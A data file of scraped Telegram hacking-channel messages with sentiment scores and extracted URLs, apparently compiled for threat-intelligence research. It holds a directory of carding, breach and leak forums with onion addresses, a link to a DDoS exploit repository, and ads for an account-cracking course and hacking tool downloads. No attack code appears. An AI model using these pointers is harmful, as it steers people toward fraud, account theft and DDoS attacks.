+|[RAMP (Old)](http://wavbeudogz6byhnardd2lkp2jafims3j7...ffqd.onion) | OFFLINE | |
+|[RAMP (Dark)](http://rampjcdlqvgkoz5oywutpo6ggl7g6tvdd...xqqd.onion) | ONLINE | |
+|[RAMP (Deep)](https://ramp4u.io) | ONLINE | |","{'neg': 0.196, 'neu': 0.804, 'pos': 0.0, 'compound': -0.9851}",-0.9851,ICD,,"http://dwforumuugiyderhybcpfxmlmoawgq6z3...ybad.onion,https://eleaks.to,https://www.enclave.cc,https://endway.su,https://eternia.to,https://evilarmy.in,https://exploitivzcm5dawzhe6c32bbylyggbj...kmqd.onion,https://exploit.in,https://exploits.ws,https://forumteam.online,https://forumteam.top,https://fssquad.com,https://www.g0d.one,http://gerkipwhfuqeeizl.onion,https://getrekt.io,https://t.me,https://hackforums.net,http://hacktowns3sba2xavxecm23aoocvzciax...kTown.html,http://fahue6hb7odzns36vfoi2dqfvqvjq4btt...nion,http://hohekammer.cc,https://ifud.cx,https://infected-zone.com,https://infinity.ink,http://dhri7ogvfpnflpkj3sc5x7umjl4gd26bk...zmqd.onion,https://in4.bz,http://o3nqszgvtqwcc2mxqcqgeyulkh6spiv6y...5aad.onion,http://korovka.cc,https://leakbase.cc,https://leakbase.org,https://leakforums.su,https://leaks.so,https://leak.sx,https://level23hacktools.com,https://lolz.guru,http://lowendtalk.com,https://mailpass.club,https://masthead.social,https://megatop.biz,https://mipped.com,https://mmgp.com,https://moneymn.club,http://zcfl6nxpefzmythaqbqi7s3fgjsb4tobp...ijid.onion,https://niflheim.top,https://niggaforums.net,https://niggaforums.me,http://3nzoldnxplag42gqjs23xvghtzf6t6yzs...oad.onion,https://nohide.space,https://www.nulled.to,https://nulledbb.com,https://www.ogusers.com,https://omerta.cc,https://omerta.wf,https://omerta.cx,https://omert.cc,https://openssource.org,https://patched.to,https://payload.sh,https://phreaker.info,https://s1.piratebuhta.net,https://probiv.one,https://procrd.pw,http://psphere7gzibrekpbvzitrul46aol2ibv...aad.onion,https://prologic.su,https://proton.sc,https://rf.ws,https://raid.lol,https://rfmirror.com,https://raidforums2.com,https://raidforumstwo.com,https://raidforums.com,http://rambleeeqrhty6s5jgefdfdtc6tfgg4jj...baad.onion,http://ramp4u5iz4xx75vmt6nk5xfrs5mrmtokz...7zid.onion,http://wavbeudogz6byhnardd2lkp2jafims3j7...ffqd.onion,http://rampjcdlqvgkoz5oywutpo6ggl7g6tvdd...xqqd.onion,https://ramp4u.io",,
+-1001574796698,2024-03-01 09:56:29,"רשימה של פורומים וערוצים 
+|Name|Status|Description|
+| ------ | ------ | ------ |
+|[4CHEAT](https://4cheat.ru/)|ONLINE||
+|[AGAINSTTHEWEST](http://giphvoitymatg4cv7bxqh5dz6sn6bfscy...rayd.onion) | OFFLINE | |
+|[ALTENEN (Deep)](https://altenens.is)| ONLINE | |
+|[ANTIMIGALKI](https://antimigalki.space)| ONLINE | |
+|[ARBITRAJ](https://arbitraj-forum.ru)| ONLINE | |
+|[ASCARDING](https://ascarding.com)| ONLINE | |
+|[ASTROPID](https://astropid.net)| ONLINE 
+|[BDF CLUB](https://bdfclub.com)| ONLINE | |
+|[BEST CARDING WORLD](http://bestteermb42clir6ux7xm76d4jjodh3f...2wqd.onion) | ONLINE | |
+|[BHF](https://bhf.io)| OFFLINE | |
+|[BHF](https://bhf.im)| ONLINE | |
+|[BITCOINFO.RU](http://bitcoinfor.ru)|ONLINE
+|[BITS.MEDIA](https://forum.bits.media)|ONLINE||
+|[BLACKBIZ](https://blackbiz.top)|ONLINE||
+|[BLACKBONES](https://blackbones.net)|ONLINE||
+|[BLACKHACKER](https://blackhacker.pw)|ONLINE||
+|[BLACKFORUMS](https://blackforums.net)| ONLINE | |
+|[BLACKFORUMS](https://blackforums.me)| ONLINE | |
+|[BLACKHATWORLD](https://blackhatworld.com)| ONLINE | |
+|[BREACH FORUMS](https://breachforums.vc)| OFFLINE | |
+|[BREACH FORUMS](https://breachforums.cx)| ONLINE | |
+|[BREACH FORUMS (Dark)](http://breachedu76kdyavc6szj6ppbplfqoz3p...eayd.onion)| ONLINE | |
+|[BREACHED (Dark)](http://breached65xqh64s7xbkvqgg7bmj4nj76...ejqd.onion)| OFFLINE | |
+|[BREACHED (Deep)](https://breached.co)| OFFLINE | |
+|[BREACHED (Deep)](https://breached.to)| OFFLINE | |
+|[BREACHED (Deep)](https://breached.vc)| OFFLINE | |
+|[BTTFORUM](https://btt-club.top)| OFFLINE | |
+|[CARDERS.BIZ](https://carders.biz)| ONLINE | |
+|[CARDING FORUM (Deep)](https://cardingforum.cx)| OFFLINE | |
+|[CENTER CLUB](https://center-club.io)| ONLINE | |
+|[CHITACHOK](https://chitachok.ru)| ONLINE | |
+|[COMFYBOX](https://comfybox.floofey.dog)| ONLINE | |
+|[COOKIEPRO](https://coockie.pro)| ONLINE | |
+|[CRACKED](https://cracked.io)| ONLINE | |
+|[CRACKING KING](https://crackingking.com)| OFFLINE | |
+|[CRACKING PRO](https://www.crackingpro.com)| ONLINE | |
+|[CRACKING X](https://crackingx.com)| ONLINE | |
+|[CRAX PRO](https://crax.pro)| OFFLINE | |
+|[CRDCLUB (Dark)](http://crdclub4wraumez4.onion)| OFFLINE | |
+|[CRDCLUB](https://crdclub.su)| OFFLINE | |
+|[CRDPRO](https://crdpro.cc)| ONLINE | |
+|[CRIMENETWORK (Dark)](http://cnw4acab23przeum6ios6pw63ivxxbrvp...4fqd.onion)| ONLINE | |
+|[CRIMENETWORK (Deep)](http://crime.to)| ONLINE | |
+|[CRYPTBB](http://cryptbbtg65gibadeeo2awe3j7s6evg7e...ebid.onion)| ONLINE | |
+|[CRYPTOCURRENCY.TECH](https://forum.cryptocurrency.tech)| ONLINE | |
+|[CRYPTOFF](https://forum.cryptoff.org)| ONLINE | |
+|[CRYPTOGID](http://cryptogid.org)| ONLINE | |
+|[CVV_BOARD](https://cvvbrd.info)| ONLINE | |
+|[CYBHACK](https://cybhack.net)| ONLINE | |
+|[DANGEROUSTHINGS](https://forum.dangerousthings.com)| ONLINE | |
+|[DARKWEB](http://dwforumuugiyderhybcpfxmlmoawgq6z3...ybad.onion)| ONLINE | |
+|[DARK2WEB](https://dark2web.net)| ONLINE | |
+|[DARKCLUB](https://darkclub.pw)| ONLINE | |
+|[DARKFORUM](https://darkforum.net)| ONLINE | |
+|[DARKFORUMS](https://darkforums.me)| ONLINE | |
+|[DARKMARKET.AT](https://darkmarket.at)| OFFLINE | |
+|[DARKMARKET.CX](https://darkmarket.cx)| OFFLINE | |
+|[DARKMONEY](https://darkmoney.lc)| ONLINE | |
+|[DARKNET](https://darknet.ug)| ONLINE | |
+|[DARKNETWORLD](https://www.darknetworld.com)| OFFLINE | |
+|[DARKSIDE](https://www.dark-side.black)| OFFLINE | |
+|[DATACLOUD](https://datacloud.space)| ONLINE | |
+|[DEDICATET](https://dedicatet.com)| ONLINE | |
+|[DEFCON](http://ezdhgsy2aw7zg54z6dqsutrduhl22moam...wfad.onion)| OFFLINE | |
+|[DEMONFORUMS](https://demonforums.net)| ONLINE | |
+|[DRDARK](https://drdark.ru)| ONLINE | |
+|[DREAD](http://dreadytofatroptsdj6io7l3xptbet6on...brad.onion)| ONLINE | |
+|[DUBLIKAT.CLUB](https://at.dublikat.club)| ONLINE | |
+|[DUBLIKAT.PRO](https://my.dublikat.pro)| OFFLINE | |
+|[DUMPFORUMS (Deep)](https://dumpforums.to/)| ONLINE | |
+|[DUMPFORUMS (Dark)](http://cwtvplqgymm3kbzj7g2qijhpau4tcco52...eqd.onion/)| ONLINE | |
+|[DWF (Tor v2)](http://dwforumsmrcqdnt3.onion)| OFFLINE | |","{'neg': 0.227, 'neu': 0.773, 'pos': 0.0, 'compound': -0.9879}",-0.9879,ICD,,"https://4cheat.ru,http://giphvoitymatg4cv7bxqh5dz6sn6bfscy...rayd.onion,https://altenens.is,https://antimigalki.space,https://arbitraj-forum.ru,https://ascarding.com,https://astropid.net,https://bdfclub.com,http://bestteermb42clir6ux7xm76d4jjodh3f...2wqd.onion,https://bhf.io,https://bhf.im,http://bitcoinfor.ru,https://forum.bits.media,https://blackbiz.top,https://blackbones.net,https://blackhacker.pw,https://blackforums.net,https://blackforums.me,https://blackhatworld.com,https://breachforums.vc,https://breachforums.cx,http://breachedu76kdyavc6szj6ppbplfqoz3p...eayd.onion,http://breached65xqh64s7xbkvqgg7bmj4nj76...ejqd.onion,https://breached.co,https://breached.to,https://breached.vc,https://btt-club.top,https://carders.biz,https://cardingforum.cx,https://center-club.io,https://chitachok.ru,https://comfybox.floofey.dog,https://coockie.pro,https://cracked.io,https://crackingking.com,https://www.crackingpro.com,https://crackingx.com,https://crax.pro,http://crdclub4wraumez4.onion,https://crdclub.su,https://crdpro.cc,http://cnw4acab23przeum6ios6pw63ivxxbrvp...4fqd.onion,http://crime.to,http://cryptbbtg65gibadeeo2awe3j7s6evg7e...ebid.onion,https://forum.cryptocurrency.tech,https://forum.cryptoff.org,http://cryptogid.org,https://cvvbrd.info,https://cybhack.net,https://forum.dangerousthings.com,http://dwforumuugiyderhybcpfxmlmoawgq6z3...ybad.onion,https://dark2web.net,https://darkclub.pw,https://darkforum.net,https://darkforums.me,https://darkmarket.at,https://darkmarket.cx,https://darkmoney.lc,https://darknet.ug,https://www.darknetworld.com,https://www.dark-side.black,https://datacloud.space,https://dedicatet.com,http://ezdhgsy2aw7zg54z6dqsutrduhl22moam...wfad.onion,https://demonforums.net,https://drdark.ru,http://dreadytofatroptsdj6io7l3xptbet6on...brad.onion,https://at.dublikat.club,https://my.dublikat.pro,https://dumpforums.to,http://cwtvplqgymm3kbzj7g2qijhpau4tcco52...eqd.onion,http://dwforumsmrcqdnt3.onion",,
+-1001574796698,2023-10-09 21:10:24,"כלי נוסף לתקיפת DDos 
+דורש api של סודאן 
+https://github.com/649/Memcrashed-DDoS-Exploit/tree/master","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,https://github.com,,
+-1001574796698,2023-10-06 13:33:41,"🔰BLACK HAT CRACKING COURSE (NETFLIX, AMAZON PRIMZE, HOTSTAR CRACKING)🎩
+
+🔥Cracking Premium Accounts like (Netflix,Amazon Prime,Spotify)
+🔥Learn Creating your Own Configs,Combolist and Proxies and Crack into Accounts Easily
+🔥Create your RDP for Free to Crack into Premium Accounts
+🔥Earn from Cracking accounts
+ 
+➖➖➖➖➖➖➖➖➖➖
+
+⛏ Download Here -    
+
+Download Link  1 : -  https://link-center.net/886759/black-hat-cracking-course (Linvertise Link)
+
+Download Link  2: -   https://clk.today/MDvd (GP Link)","{'neg': 0.0, 'neu': 0.796, 'pos': 0.204, 'compound': 0.8964}",0.8964,ICD,,"https://link-center.net,https://clk.today",,
+-1001574796698,2023-10-06 08:02:07,"🔥Hacking Tools Collection
+
+1. DDoS
+2. Forensics
+3. Programming
+4. Exploitation
+5. Phone Hacking
+6. Server Hacking
+7. Client Hacking
+8. Website Hacking
+9. Network Hacking
+10. Wireless Hacking
+11. Reverse Engeenering
+12. Information Gathering
+
+#DDoS
+1. MDK3
+2. LOIC
+3. HULK
+4. DDOSIM
+5. Ufonet
+6. Hping3
+7. Xerxes
+8. Hammer
+9. Slowloris
+10. Websploit
+11. GoldenEye
+12. Metasploit
+13. Aireplay-ng
+14. Slowhttptest
+
+#Forensics
+1. COFEE
+2. Volafox
+3. Autopsy
+4. Foremost
+5. Hashdeep
+6. Binwalk
+
+#Programming
+1. Notepad++
+2. Visual Studio
+3. Text Editor
+
+#Exploitation
+1. Metasploit
+2. Sqlmap
+3. Core Imact
+4. W3af
+5. BeEF
+6. Dradis
+
+#Phone_Hacking
+1. Metasploit
+2. Apktool
+3. Droidjack
+4. AndroRAT
+5. Spynote
+
+#Server_Hacking
+1. SQLmap
+2. Jsql
+3. Havij
+4. Hydra
+5. Metasploit
+6. Armitage
+7. Brupsuite
+8. Owasp-ZAP
+9. Invicti
+10. Acunetix
+11. OpenVAS
+
+#Client_Hacking
+1. Darkcomet
+2. FatRat
+3. Veil-Evasion
+4. Shallter
+5. Unicorn
+6. Setoolkit
+7. Armitage
+8. BeEF-Framework
+9. EmPyre
+10. FakeImageExploiter
+11. Pupy
+12. DFU-Programmer
+13. Cobalt Strike
+14. Exploitpack
+15. Gcat
+16. Crowbar
+
+#Website_Hacking
+1. Sn1per
+2. Owasp-ZAP
+3. Brupsuite
+4. Invicti
+5. Acunetix
+6. SQLmap
+7. Xsser
+8. WPScan
+9. Joomrra
+10. Joomscan
+11. WPSeku
+12. XSStrike
+13. Kadimus
+14. jexboss
+15. CMSmap
+16. brut3k1t
+17. 0d1n
+18. CloudFail
+19. Arachni
+20. Nikto
+21. Webscarab
+22. Nmap
+23. Vbscan
+24. Sentry MBA
+
+#Network_Hacking
+1. MITMf
+2. Bettercap
+3. Ettercap
+4. Tcpdump
+5. Wireshark
+6. Driftnet
+7. SSLstrip
+8. Armitage
+9. Metasploit
+10. Xerosploit
+11. Sparta
+12. Hydra
+
+#Wireless_Hacking
+1. Wifite
+2. Airodump-ng
+3. Aireplay-ng
+4. Wash
+5. WiFi Pumpkin
+6. Wifiphisher
+7. Fluxion
+8. Infernal Twin
+9. WPSpin
+
+#Reverse_Engeenering
+1. OWASP-ZSC
+2. OllyDBG
+3. Apktool
+
+#OSINT
+1. OSINT Framework
+2. CheckUserNames
+3. HaveIbeenPwned
+4. SecurityTrails API
+5. Censys
+6. Wappalyzer
+7. Google Dorks
+8. Maltego
+9. Recon-Ng
+10. theHarvester
+11. Shodan
+12. Jigsaw
+13. SpiderFoot
+14. Creepy
+15. Nmap
+16. WebShag
+17. OpenVAS
+18. Fierce
+19. Unicornscan
+20. Foca
+21. ZoomEye
+22. OWASP Amass
+23. IVRE
+24. Metagoofil
+25. Exiftool","{'neg': 0.009, 'neu': 0.991, 'pos': 0.0, 'compound': -0.25}",-0.25,ICD,,,,
+-1001574796698,2023-10-02 06:12:22,"💻Exploit Chain 2023💻
+
+An Exploit Chain is an attack that involves multiple exploits or attacks that are chained together to fully compromise a device. In these attacks, Hackers cannot use a single exploit to compromise their target but instead can combine a series of exploits that ultimately lead to malware getting installed on a smartphone (iOS or Android) which can lead to the loss of critical and sensitive data.  In the cases described in the video below, the websites visited by unsuspecting users contain a variety of attacks which when chained together can compromise the smart phones targeted.
+
+✔️HOW DO I PROTECT MYSELF?
+
+There are a few strategies you can employ to protect yourself from these chained exploits including:
+
+💡Patch your iOS/Android device to the latest version of vendor OS for the best chance of protection based upon Apple and Android fixing these things without publicly disclosing them to the public.
+
+💡Reboot your phone.  These exploit chains in their current incarnation was only valid while the device was live after visiting the malicious website.  Rebooting the device reverted to a pristine OS.
+
+🚨Exploit Guide🚨
+https://telegra.ph/Exploitation-Guide-By-IMK-03-26
+
+✅Example. Video✔️
+https://youtu.be/66G1bV9kwI8","{'neg': 0.184, 'neu': 0.685, 'pos': 0.131, 'compound': -0.8122}",-0.8122,ICD,,"https://telegra.ph,https://youtu.be",,
+-1001574796698,2023-09-29 06:17:11,"❇️**ADVANCE WEB HACKING TOOLS**🔴
+
+
+●Havij
+●NetDatabaseScanner
+●Open Web Spider
+●Quick Web
+●Site Hog
+●Snippets Manager
+●Spider Mail
+●SQL Injection
+●SQL Map Project
+●The Mole ZeroTeam™ MD5 Password Encryptor
+●Acunetix Web Vulnerability Scanner
+●Advanced Deface Creator 1.3
+●Anonymous DNS Extractor-2013
+●Anonymous FTP Stealer
+●Anonymous Text Encrypter
+●Anonymous Tinypaste Uploader
+●Ashiyane SQL Scanner
+●Base64 Image Encoder-Decoder
+●BTI Admin Page Finder v2
+●BTI HTML Encoder-Decoder
+●BTI Multi Site Checker
+
+ ➖➖➖➖
+
+⛏ Download Here -     
+ 
+Download Link  1 : -  https://link-center.net/886759/advance-web-hacking-tools  (Linvertise Link)
+
+
+Download Link  2: -   https://onotepad.com/zeH1Ni  (GP Link)","{'neg': 0.032, 'neu': 0.932, 'pos': 0.036, 'compound': 0.0772}",0.0772,ICD,,"https://link-center.net,https://onotepad.com",,
